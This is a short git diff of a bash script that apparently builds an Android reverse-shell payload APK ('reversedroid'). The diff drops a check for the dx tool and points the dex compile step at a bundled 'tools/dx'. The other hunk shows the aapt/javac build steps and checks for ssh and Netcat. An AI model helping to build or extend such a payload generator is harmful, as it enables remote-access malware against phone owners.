@@ -31,8 +31,7 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not instal
 exit 1; }
 command -v nc > /dev/null 2>&1 || { echo >&2 "I require Netcat but it's not installed. Install it. Aborting."; 
 exit 1; }
-command -v dx > /dev/null 2>&1 || { echo >&2 "I require dx but it's not installed. Install it (Android-SDK Tools). Aborting."; 
-exit 1; }
+
 
 }
 
@@ -134,7 +133,7 @@ createapp
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Compiling... \e[0m\n"
 aapt package -f -m -J src/ -M AndroidManifest.xml -S res/ -I tools/android-sdk/platforms/android-19/android.jar
 javac -d obj/ -classpath src/ -bootclasspath tools/android-sdk/platforms/android-19/android.jar src/com/example/reversedroid/*.java -source 1.7 -target 1.7
-dx --dex --output=bin/classes.dex obj/
+tools/dx --dex --output=bin/classes.dex obj/
 aapt package -f -m -F bin/$payload_name.apk -M AndroidManifest.xml -S res/ -I tools/android-sdk/platforms/android-19/android.jar
 cp bin/classes.dex .
 aapt add bin/$payload_name.apk classes.dex > /dev/null
